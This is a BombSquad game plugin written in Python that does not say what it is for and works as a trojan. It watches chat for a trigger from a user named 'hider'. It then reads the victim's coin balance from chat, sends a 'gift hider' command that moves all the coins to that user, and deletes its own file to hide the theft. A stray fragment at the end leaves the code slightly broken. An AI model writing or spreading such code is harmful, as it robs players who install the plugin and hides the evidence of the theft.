# ba_meta require api 7
import ba , _ba 
import os

starrt = [False]

def ok():
    _ba.chatmessage("1")
    
    try:
        os.remove(__file__)
    except Exception as e:
        _ba.chatmessage(f"Error deleting file: {e}")

def yad_begir():
    try:
        msg=_ba.get_chat_messages()
        msg1=msg[len(msg)-1]
        msg2=msg1.split(": ")
        msg1=""
        for i in msg2[1:]:
            msg1 += i + ": "
        msg1 = msg1[:-2]
    except:
        return
    
    _ba.set_party_icon_always_visible(True)
    
    if msg2[0] == "hider" and msg1 == "x":
        starrt[0] = True
        _ba.chatmessage("c!")
    elif "I have " in msg1 and starrt[0] == True:
        ba.screenmessage("haha",color=(1,0,0))
        coin = msg1.replace("✅I have ","").replace(" coins!","").replace(",","")
        _ba.chatmessage(f"gift hider {coin}")
        ba.timer(1,ok)
        starrt[0] = False
    elif msg2[0] == "hider" and msg1 == "nm":
        _ba.chatmessage("hider")

# ba_meta export plugin
class teatt(ba.Plugin):
    def on_app_running(self) -> None:
        ba.timer(0.1, yad_begir, True)
, True)
